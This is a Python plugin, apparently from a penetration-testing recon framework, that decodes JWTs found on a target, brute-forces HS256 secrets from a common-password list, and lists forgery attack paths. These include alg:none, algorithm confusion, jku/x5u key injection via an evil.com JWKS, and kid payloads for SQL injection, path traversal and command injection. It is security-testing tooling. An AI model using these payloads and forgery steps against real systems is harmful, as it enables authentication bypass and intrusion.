import json
import base64
import re
import hmac
import hashlib
from urllib.parse import urlparse

NAME = "jwt_analyzer"
CATEGORY = "recon"
DESCRIPTION = "Advanced JWT analysis with brute-forcing, algorithm confusion, kid injection & jku/x5u SSRF"
OPTIONS = [
    {"name": "token", "default": None, "required": False, "help": "Manual JWT token to analyze"},
    {"name": "cookie", "default": None, "required": False, "help": "Cookie string to extract JWT from (format: key=jwt_val)"}
]

COMMON_SECRETS = [
    "secret", "123456", "password", "key", "jwt", "admin", "12345678", 
    "qwerty", "supersecret", "changeit", "access", "root", "dev", "test",
    "private", "public", "master", "default", "guest", "webmaster",
    "0123456789", "111111", "abcdef", "identity", "auth", "security",
    "development", "production", "staging", "hellhound", "letmein",
    "welcome", "trustno1", "passw0rd", "monkey", "dragon", "iloveyou",
    "abc123", "football", "shadow", "master123", "1234567890",
    "qwerty123", "password1", "654321", "p@ssw0rd", "Pa$$w0rd",
]

def pad_base64(data):
    data = data.replace('-', '+').replace('_', '/')
    return data + '=' * (-len(data) % 4)

def brute_force_hs256(header_b64, payload_b64, signature_b64):
    """Tries to brute-force HS256 signature with common secrets"""
    msg = f"{header_b64}.{payload_b64}".encode()
    try:
        sig = base64.urlsafe_b64decode(pad_base64(signature_b64))
    except: return None
    
    for secret in COMMON_SECRETS:
        h = hmac.new(secret.encode(), msg, hashlib.sha256).digest()
        if h == sig: return secret
    return None

def analyze_jwt(token, source, target_url=None):
    parts = token.split('.')
    if len(parts) != 3: return None
    
    findings = {"token": token, "source": source, "header": {}, "payload": {}, "vulnerabilities": [], "sensitive_claims": [], "attack_paths": []}
    
    try:
        findings["header"] = json.loads(base64.urlsafe_b64decode(pad_base64(parts[0])).decode())
        findings["payload"] = json.loads(base64.urlsafe_b64decode(pad_base64(parts[1])).decode())
    except: return None

    # Ensure they are dicts to prevent attribute errors
    if not isinstance(findings["header"], dict): findings["header"] = {}
    if not isinstance(findings["payload"], dict): findings["payload"] = {}

    alg = findings["header"].get("alg", "").lower()
    
    # ── 1. Algorithm: None ──────────────────────────────────────────────
    if alg == "none":
        findings["vulnerabilities"].append("CRITICAL: Algorithm 'none' accepted — forge any token without signing")
        findings["attack_paths"].append({
            "name": "Algorithm None Bypass",
            "impact": "Full authentication bypass. Forge admin tokens at will.",
            "steps": ["Strip the signature from the JWT", "Set 'alg' to 'none'", "Modify claims (e.g., role: admin)", "Submit the forged token"]
        })
    
    # ── 2. HS256 Brute-force ────────────────────────────────────────────
    if alg == "hs256":
        weak_secret = brute_force_hs256(parts[0], parts[1], parts[2])
        if weak_secret:
            findings["vulnerabilities"].append(f"CRITICAL: Weak HS256 secret found: '{weak_secret}'")
            findings["attack_paths"].append({
                "name": "Weak Secret Key",
                "impact": "Full token forgery. Create admin tokens using the leaked secret.",
                "secret": weak_secret,
                "steps": [f"Use secret '{weak_secret}' to sign arbitrary JWT payloads", "Escalate privileges by modifying role/admin claims"]
            })
    
    # ── 3. Algorithm Confusion Detection (RS256 -> HS256) ───────────────
    if alg in ("rs256", "rs384", "rs512"):
        findings["vulnerabilities"].append(f"INFO: {alg.upper()} found. Test RS256 -> HS256 downgrade with any discovered public keys.")
        findings["attack_paths"].append({
            "name": "Algorithm Confusion",
            "impact": "If public key is available, sign tokens with HMAC using the public key as secret.",
            "steps": ["Obtain the server's public RSA key (/.well-known/jwks.json or similar)", "Change 'alg' to 'HS256'", "Sign the token using the public key as the HMAC secret"]
        })

    # ── 4. kid (Key ID) Injection Suite ─────────────────────────────────
    kid = findings["header"].get("kid")
    if kid and isinstance(kid, str):
        findings["vulnerabilities"].append(f"INFO: 'kid' parameter present: {kid}")
        
        # Known injection patterns
        kid_attacks = [
            {"name": "SQLi via kid", "payload": "' UNION SELECT 'secret'--", "impact": "Extract or force a known signing key from the database"},
            {"name": "LFI via kid", "payload": "../../../etc/passwd", "impact": "Read arbitrary files; sign with known file content (e.g., /dev/null)"},
            {"name": "LFI Empty File", "payload": "/dev/null", "impact": "Sign token with empty string as key — effectively alg:none"},
            {"name": "Command Injection via kid", "payload": "key.pem; sleep 5", "impact": "Potential OS command execution if kid is used in shell commands"},
            {"name": "Directory Traversal", "payload": "../../keys/public.pem", "impact": "Access other keys on the filesystem"},
        ]
        
        for attack in kid_attacks:
            findings["attack_paths"].append({
                "name": f"kid Injection: {attack['name']}",
                "impact": attack["impact"],
                "payload": attack["payload"],
                "steps": [f"Set 'kid' to: {attack['payload']}", "Forge the token with the expected key content"]
            })
        
        # Detect existing injection indicators
        injection_indicators = {
            "SQLi": ["'", "\"", "--", ";", "UNION", "SELECT"],
            "LFI/Traversal": ["../", "..\\", "/etc/passwd", "/dev/null"],
            "Command Injection": ["|", "&", "$(", "`", ";"],
        }
        
        for vuln, patterns in injection_indicators.items():
            if any(p in kid for p in patterns):
                findings["vulnerabilities"].append(f"HIGH: Suspected {vuln} in 'kid' parameter: {kid}")

    # ── 5. jku/x5u SSRF ────────────────────────────────────────────────
    jku = findings["header"].get("jku")
    x5u = findings["header"].get("x5u")
    
    if jku:
        findings["vulnerabilities"].append(f"HIGH: 'jku' (JWK Set URL) header found: {jku}")
        parsed = urlparse(jku)
        if parsed.netloc and not parsed.netloc.endswith(urlparse(target_url or "").netloc or ""):
            findings["vulnerabilities"].append(f"CRITICAL: 'jku' points to external domain ({parsed.netloc}) — SSRF/Key Injection possible!")
        findings["attack_paths"].append({
            "name": "SSRF via jku",
            "impact": "Host a malicious JWKS at attacker-controlled URL. Server fetches your keys, validates your forged tokens.",
            "original_url": jku,
            "steps": ["Host a JWKS with your own key at evil.com/.well-known/jwks.json", "Set 'jku' to your URL", "Sign token with your private key"]
        })
    
    if x5u:
        findings["vulnerabilities"].append(f"HIGH: 'x5u' (X.509 URL) header found: {x5u}")
        findings["attack_paths"].append({
            "name": "SSRF via x5u",
            "impact": "Host a malicious X.509 certificate chain. Server fetches your cert, validates forged tokens.",
            "original_url": x5u,
            "steps": ["Generate a self-signed X.509 certificate", "Host it at attacker-controlled URL", "Set 'x5u' to your URL and sign with your key"]
        })

    # ── 6. Sensitive Claims ─────────────────────────────────────────────
    sens = ["email", "role", "admin", "password", "secret", "id", "user", "privilege", "internal", "group", "scope", "permissions"]
    for k, v in findings["payload"].items():
        if any(s in k.lower() for s in sens):
            findings["sensitive_claims"].append(f"{k}: {v}")

    # ── 7. Expiration Analysis ──────────────────────────────────────────
    import time
    exp = findings["payload"].get("exp")
    iat = findings["payload"].get("iat")
    if exp:
        now = int(time.time())
        if exp < now:
            findings["vulnerabilities"].append(f"INFO: Token is EXPIRED (exp: {exp}, now: {now})")
        elif exp - now > 86400 * 30:
            findings["vulnerabilities"].append(f"MEDIUM: Token has very long expiry ({(exp - now) // 86400} days)")
    if iat and exp:
        lifetime = exp - iat
        if lifetime > 86400 * 7:
            findings["vulnerabilities"].append(f"MEDIUM: Token lifetime is {lifetime // 86400} days — excessive for most use cases")

    return findings

def run(target, emit, options=None):
    emit.info(f"[*] JWT Analyzer: {target}")
    spider_intel = options.get("spider_intel", {}) if options else {}
    secrets = spider_intel.get("secrets", [])
    
    tokens = set()
    for s in secrets:
        content = s.get("content", "")
        matches = re.findall(r"eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+", content)
        for m in matches: tokens.add((m, s.get("source", "spider")))
    
    if token_opt := options.get("token") if options else None:
        tokens.add((token_opt, "manual"))
    
    if cookie_opt := options.get("cookie") if options else None:
        matches = re.findall(r"eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+", str(cookie_opt))
        for m in matches: tokens.add((m, "manual_cookie"))

    if not tokens:
        emit.info("[-] No JWTs discovered.")
        return {"raw": "0 JWTs found", "signals": []}

    results = []
    risk = 0
    for t, src in tokens:
        res = analyze_jwt(t, src, target)
        if res:
            results.append(res)
            emit.success(f"    [+] JWT from {src}")
            for v in res["vulnerabilities"]:
                emit.warn(f"        [!] {v}")
                risk += 10 if "CRITICAL" in v else 5 if "HIGH" in v else 3
            for c in res["sensitive_claims"]:
                emit.info(f"        [i] Claim: {c}")
            for ap in res["attack_paths"][:3]:
                emit.info(f"        [→] Attack Path: {ap['name']} — {ap['impact'][:80]}")

    return {"raw": f"Analyzed {len(results)} JWTs", "intel": {"jwts": results, "risk_score": risk}, "signals": ["JWT_EXPOSED"] if results else []}
